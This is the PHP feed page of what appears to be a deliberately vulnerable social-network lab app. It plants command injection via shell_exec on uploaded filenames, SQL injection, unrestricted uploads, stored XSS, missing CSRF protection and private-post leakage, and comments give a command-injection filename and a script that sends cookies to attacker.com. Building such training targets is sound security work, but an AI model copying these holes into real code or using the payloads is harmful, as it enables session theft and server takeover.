<?php
require_once 'includes/db.php';
require_login();
if (!empty($_SESSION['is_admin'])) { header('Location: admin.php'); exit; }

$uid = $_SESSION['user_id'];
$error = $success = '';
$xss_ai_fixed = ai_fix_rule_active($conn, 'xss_probe', '/index.php');
$private_ai_fixed = ai_fix_rule_active($conn, 'private_disclosure', '/index.php');

// Handle new post
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['post_content'])) {
    $content    = $_POST['post_content'];
    $is_private = isset($_POST['is_private']) ? 1 : 0;
    $image_name = '';

    // Handle image upload
    if (!empty($_FILES['post_image']['name'])) {
        $orig      = $_FILES['post_image']['name'];
        $tmp       = $_FILES['post_image']['tmp_name'];
        log_if_suspicious_payload($conn, $orig, 'Post image upload filename', 'filename=' . $orig);
        // VULN: no extension whitelist, no MIME check
        $image_name = $orig;
        move_uploaded_file($tmp, UPLOAD_DIR . $image_name);

        // ===== VULN: Command Injection via exiftool metadata =====
        // Attacker sets image filename as: shell.php"; touch /tmp/pwned; echo "
        $cmd    = "exiftool " . UPLOAD_DIR . $image_name . " 2>&1";
        $output = shell_exec($cmd);
        // metadata stored unsanitized
    }

    // ===== VULN: Stored XSS — content not sanitized before DB insert =====
    // Payload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
    log_if_suspicious_payload($conn, $content, 'New post content', 'user_id=' . $uid);
    if ($xss_ai_fixed) {
        $stmt = $conn->prepare("INSERT INTO posts (user_id, content, image, is_private, status) VALUES (?, ?, ?, ?, 'pending')");
        $stmt->bind_param("issi", $uid, $content, $image_name, $is_private);
        $stmt->execute();
    } else {
        $conn->query("INSERT INTO posts (user_id, content, image, is_private, status) VALUES ($uid, '$content', '$image_name', $is_private, 'pending')");
    }
    $_SESSION['post_success'] = 'Post submitted for admin review!';
    header("Location: index.php");
    exit;
}

if (isset($_SESSION['post_success'])) {
    $success = $_SESSION['post_success'];
    unset($_SESSION['post_success']);
}

// ===== VULN: Private posts disclosure — shows ALL posts including private =====
// Should be: WHERE is_private=0 OR user_id=$uid
if ($private_ai_fixed) {
    $posts = $conn->query("
        SELECT p.*, u.username, u.avatar, u.full_name
        FROM posts p
        JOIN users u ON p.user_id = u.id
        WHERE (p.is_private=0 OR p.user_id=$uid)
          AND (p.status='approved' OR p.user_id=$uid)
        ORDER BY p.created_at DESC
    ");
} else {
    $posts = $conn->query("
        SELECT p.*, u.username, u.avatar, u.full_name
        FROM posts p
        JOIN users u ON p.user_id = u.id
        ORDER BY p.created_at DESC
    ");
}
?>
<?php require_once 'includes/header.php'; ?>
<div class="feed-layout">
    <div class="feed-main">
        <!-- New Post Form -->
        <div class="post-form card">
            <div style="display: flex; gap: 14px; align-items: flex-start; margin-bottom: 12px;">
                <?php if ($header_user && $header_user['avatar']): ?>
                    <img src="/uploads/<?= htmlspecialchars($header_user['avatar']) ?>" class="avatar-sm">
                <?php else: ?>
                    <div class="avatar-sm" style="background: var(--primary-light); display: flex; align-items: center; justify-content: center; border-radius: 50%; border: 2px solid #fff; box-shadow: var(--shadow-sm); width: 48px; height: 48px;"><i class="fas fa-user" style="color: var(--primary);"></i></div>
                <?php endif; ?>
                <div style="flex: 1;">
                    <h3 style="margin-bottom: 4px; font-size: 1.1rem; font-weight: 600;">What's on your mind?</h3>
                    <span style="font-size: 0.8rem; color: var(--muted);">Share your moments with friends</span>
                </div>
            </div>
            <?php if ($success): ?>
                <div class="alert alert-success">
                    <i class="fas fa-circle-check"></i> <?= $success ?>
                </div>
            <?php endif; ?>
            <form method="POST" enctype="multipart/form-data">
                <!-- VULN: no CSRF token -->
                <textarea name="post_content" class="form-control" rows="3" placeholder="Share something with the world..." required></textarea>
                <div class="post-options" style="margin-top: 12px;">
                    <div style="display: flex; align-items: center; gap: 16px; flex-wrap: wrap;">
                        <label style="cursor: pointer; font-size: 0.85rem; font-weight: 600; display: inline-flex; align-items: center; user-select: none;">
                            <input type="checkbox" name="is_private"> 🔒 Private post
                        </label>
                        <label style="cursor: pointer; font-size: 0.85rem; font-weight: 600; display: inline-flex; align-items: center; color: var(--accent-dark); user-select: none; background: var(--accent-light); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(78,205,196,0.15); transition: var(--transition-smooth);">
                            <i class="fas fa-image" style="margin-right: 6px; font-size: 1rem;"></i> Add Photo
                            <input type="file" name="post_image" accept="image/*" style="display: none;" onchange="document.getElementById('file-chosen').textContent = this.files[0] ? this.files[0].name : 'No file chosen'">
                        </label>
                        <span id="file-chosen" style="font-size: 0.75rem; color: var(--muted); max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">No file chosen</span>
                    </div>
                    <button type="submit" class="btn btn-primary"><i class="fas fa-paper-plane"></i> Post</button>
                </div>
            </form>
        </div>

        <!-- Posts Feed -->
        <?php while ($post = $posts->fetch_assoc()): ?>
        <div class="post card <?= $post['is_private'] ? 'private-post' : '' ?>">
            <div class="post-header">
                <img src="/uploads/<?= $post['avatar'] ?>" class="avatar-sm">
                <div>
                    <a href="profile.php?id=<?= $post['user_id'] ?>"><strong><?= htmlspecialchars($post['full_name']) ?></strong></a>
                    <span class="text-muted">@<?= htmlspecialchars($post['username']) ?></span>
                    <span class="status-badge status-<?= htmlspecialchars($post['status']) ?>"><?= htmlspecialchars(ucfirst($post['status'])) ?></span>
                    <?php if ($post['is_private']): ?>
                        <span class="badge-private"><i class="fas fa-lock"></i> Private</span>
                    <?php endif; ?>
                </div>
                <small class="post-time"><i class="far fa-clock"></i> <?= $post['created_at'] ?></small>
            </div>
            <div class="post-content">
                <!-- ===== VULN: Stored XSS — raw output without htmlspecialchars ===== -->
                <?= $xss_ai_fixed ? ai_safe_html($post['content']) : $post['content'] ?>
            </div>
            <?php if ($post['image']): ?>
                <img src="/uploads/<?= htmlspecialchars($post['image']) ?>" class="post-image">
            <?php endif; ?>
            <div class="post-options">
                <div class="post-actions">
                    <a href="post.php?id=<?= $post['id'] ?>"><i class="fas fa-message"></i> Comments</a>
                </div>
            </div>
        </div>
        <?php endwhile; ?>
    </div>

    <div class="feed-sidebar">
        <div class="card" style="position: sticky; top: 88px;">
            <h4 style="font-size: 1.1rem; margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 8px;"><i class="fas fa-compass" style="color: var(--primary);"></i> Navigation</h4>
            <a href="friends.php" class="sidebar-link"><i class="fas fa-user-group"></i> Find Friends</a>
            <a href="messages.php" class="sidebar-link"><i class="fas fa-envelope"></i> Messages</a>
            <a href="preview.php" class="sidebar-link"><i class="fas fa-globe"></i> URL Preview</a>
        </div>
    </div>
</div>
<?php require_once 'includes/footer.php'; ?>
